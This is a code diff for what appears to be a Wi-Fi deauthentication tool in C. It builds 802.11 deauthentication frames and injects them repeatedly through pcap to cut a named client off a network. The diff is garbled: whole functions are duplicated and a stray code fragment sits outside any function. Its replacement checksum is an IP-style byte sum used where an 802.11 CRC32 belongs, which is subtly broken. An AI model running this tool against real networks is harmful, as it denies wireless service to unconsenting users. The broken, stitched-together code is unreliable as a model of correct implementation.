@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <libnet.h>
+//#include <libnet.h>
 #include <string.h>
 #include "air_pollution.h"
 #include "air_support.h"
@@ -10,10 +10,12 @@
 /* radiotap_preamble doesn't have to be visible outside of this file */
 
 static u_char radiotap_preamble [] = {
-                                    0x00,
-                                    0x00,
-                                    0x08, 0x00,
-                                    0x00,0x00,0x00,0x00,
+    0x00, 0x00, // <-- radiotap version
+    0x0c, 0x00, // <- radiotap header length
+    0x04, 0x80, 0x00, 0x00, // <-- bitmap
+    0x00, // <-- rate
+    0x00, // <-- padding for natural alignment
+    0x18, 0x00, // <-- TX flags
 };
 
 
@@ -60,6 +62,29 @@ static u_char *build_frame(u_char *client, u_char *bssid, char frame_type, int *
 
 }
 
+unsigned short inj_cksum(unsigned char *buh, int len)
+{
+        register long sum = 0;
+        unsigned short oddbyte;
+        register unsigned short answer;
+
+        while(len > 1) {
+                sum += *buh++;
+                len -= 2;
+        }
+
+        if(len == 1) {
+                oddbyte = 0;
+                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
+                sum += oddbyte;
+        }
+
+        sum = (sum >> 16) + (sum & 0xFFFF);
+        sum += (sum >> 16);
+        answer = ~sum;
+        return answer;
+}
+
 
 void frame_inject(char *device, u_char *client, u_char *bssid, char frame_opts) {
  
@@ -92,7 +117,7 @@ void frame_inject(char *device, u_char *client, u_char *bssid, char frame_opts) 
     while (termflag != 1) {
     
         hdr_core->duration_id = rand() % 32767;
-        *((uint32_t *)frame_p) = libnet_compute_crc(packet + sizeof(radiotap_preamble), frame_size);
+        *((uint32_t *)frame_p) = inj_cksum(packet + sizeof(radiotap_preamble),frame_size);
  
         if (pcap_sendpacket(main_devhandle, packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {
          
@@ -150,7 +175,161 @@ void *frame_inject_thr(void *job_args) {
     while (1) {
     
         hdr_core->duration_id = rand_r(&rand_state) % 32767;
-        *((uint32_t *)frame_p) = libnet_compute_crc(inj_assets.packet + sizeof(radiotap_preamble), frame_size);
+        *((uint32_t *)frame_p) = inj_cksum(inj_assets.packet + sizeof(radiotap_preamble), frame_size); 
+
+
+        if (pcap_sendpacket(inj_assets.dev_handle, inj_assets.packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {
+
+            pcap_perror(inj_assets.dev_handle, "Packet injection failed");
+
+            pthread_mutex_lock(inj_args->term_mx);
+                termflag = 1;
+            pthread_mutex_unlock(inj_args->term_mx);
+
+            break;
+                 
+        }        
+     
+    }
+
+    pthread_cleanup_pop(0);
+    pthread_exit(NULL);
+ 
+} 
+
+
+    else
+        mgmt_hdr_core->frame_ctl |= DEAUTHENTICATION << 4;
+ 
+    memcpy(mgmt_hdr_core->addr_1, bssid, ETH_ALEN);
+    memcpy(mgmt_hdr_core->addr_2, client, ETH_ALEN);
+    memcpy(mgmt_hdr_core->addr_3, mgmt_hdr_core->addr_1, ETH_ALEN); 
+    mgmt_hdr_core->seq_ctl = 0;
+
+    mgmt_frame_p += sizeof(struct ieee80211a_generic_frame);
+    *((uint16_t *)mgmt_frame_p) = reason_code;
+    mgmt_frame_p += sizeof(reason_code);
+
+    *frame_tail = mgmt_frame_p;
+
+    return packet;
+
+}
+
+unsigned short inj_cksum(unsigned char *buh, int len)
+{
+        register long sum = 0;
+        unsigned short oddbyte;
+        register unsigned short answer;
+
+        while(len > 1) {
+                sum += *buh++;
+                len -= 2;
+        }
+
+        if(len == 1) {
+                oddbyte = 0;
+                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
+                sum += oddbyte;
+        }
+
+        sum = (sum >> 16) + (sum & 0xFFFF);
+        sum += (sum >> 16);
+        answer = ~sum;
+        return answer;
+}
+
+
+void frame_inject(char *device, u_char *client, u_char *bssid, char frame_opts) {
+ 
+    u_char *packet, *frame_p = NULL; 
+    int frame_size;
+    struct ieee80211a_generic_frame *hdr_core;
+
+    packet = build_frame(client, bssid, frame_opts, &frame_size, &frame_p);
+
+    if (packet == NULL)
+        perror_exit("Failed to allocate packet memory");
+
+
+    /*  Rewind back to the core header section.
+    *  We do this so that we can set the duration id
+    *  to random values.
+    */
+    hdr_core = (struct ieee80211a_generic_frame *) (frame_p - sizeof(uint16_t) - sizeof(struct ieee80211a_generic_frame));
+
+    srand(time(NULL));
+    main_devhandle = wifi_card_setup(device);
+
+
+    printf(">>>> Blocking: %02x", client[0]);
+    for (int i = 1; i < ETH_ALEN; i++) 
+        printf(":%02x", client[i]);
+
+    printf("\n");
+
+    while (termflag != 1) {
+    
+        hdr_core->duration_id = rand() % 32767;
+        *((uint32_t *)frame_p) = inj_cksum(packet + sizeof(radiotap_preamble),frame_size);
+ 
+        if (pcap_sendpacket(main_devhandle, packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {
+         
+            pcap_perror(main_devhandle, "Packet injection failed");
+            raise(SIGABRT);
+        }    
+     
+        sleep(1);   
+ 
+    }
+ 
+ 
+    free(packet);
+    pcap_close(main_devhandle);
+
+} 
+
+
+void *frame_inject_thr(void *job_args) {
+ 
+    u_char *frame_p = NULL;
+    int frame_size;
+    struct inj_thr_res inj_assets = { NULL, NULL };
+    struct ieee80211a_generic_frame *hdr_core;
+    unsigned int rand_state = time(NULL);
+
+    pthread_cleanup_push(inj_thr_cleanup, &inj_assets);
+    struct frame_thrower *inj_args = (struct frame_thrower *) job_args;
+
+    inj_assets.packet = build_frame(inj_args->client, inj_args->bssid, inj_args->frame_opts, &frame_size, &frame_p);
+
+    if (inj_assets.packet == NULL) {
+     
+        perror("Failed to allocate packet memory");
+
+        pthread_mutex_lock(inj_args->term_mx);
+        termflag = 1;
+        pthread_mutex_unlock(inj_args->term_mx);
+
+        pthread_exit(NULL);
+ 
+    }
+
+    hdr_core = (struct ieee80211a_generic_frame *) (frame_p - sizeof(uint16_t) - sizeof(struct ieee80211a_generic_frame));
+
+
+    /*  Ensure sequential access to the state variables of
+    *  libpcap (during the call to pcap_activate()).
+    */
+    pthread_mutex_lock(inj_args->pcap_mx);
+        inj_assets.dev_handle = wifi_card_setup(inj_args->dev_name);
+    pthread_mutex_unlock(inj_args->pcap_mx);
+
+ 
+    while (1) {
+    
+        hdr_core->duration_id = rand_r(&rand_state) % 32767;
+        *((uint32_t *)frame_p) = inj_cksum(inj_assets.packet + sizeof(radiotap_preamble), frame_size);
 
 
         if (pcap_sendpacket(inj_assets.dev_handle, inj_assets.packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {
